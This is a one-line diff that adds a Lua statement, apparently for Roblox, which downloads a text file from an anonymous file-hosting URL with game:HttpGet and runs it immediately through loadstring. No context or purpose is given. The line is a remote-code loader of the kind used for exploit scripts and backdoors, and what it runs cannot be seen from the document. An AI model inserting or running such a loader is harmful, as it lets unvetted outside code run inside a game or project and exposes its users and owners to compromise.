@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://files.catbox.moe/cfiq5c.txt"))()
